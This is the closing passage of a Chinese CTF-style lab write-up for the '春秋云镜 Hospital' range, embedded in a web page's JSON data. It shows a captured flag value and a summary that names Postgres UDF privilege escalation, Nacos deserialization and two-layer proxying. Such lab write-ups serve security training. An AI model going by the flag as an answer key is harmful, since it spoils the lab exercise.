MM                                 \n                               .JMML.                               \nflag04: flag{01b20010-e99a-42f1-b885-956c24a30275}\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e打靶机不能心急，但是沙砾让我心急。\u003c/p\u003e\n\u003cp\u003e涉及到 \u003ccode\u003epostgres UDF\u003c/code\u003e 提权，\u003ccode\u003eNacos\u003c/code\u003e 反序列化，二层代理搭建，等一系列利用。\u003c/p\u003e","title":"春秋云镜 - Hospital","date":"2025-04-15","updated":"2025-04-15","comments":true,"tags":["春秋云镜","Linux靶机","Windows靶机","多层代理","综合靶场","Nacos","Postgres"],"categories":"靶机","description":"Hospital https://yunjing.ichunqiu.com/major/detail/1106?type=1 在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"春秋云镜Hospital"},"buildId":"OHpHdOLaUxipBf8itlPJy","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>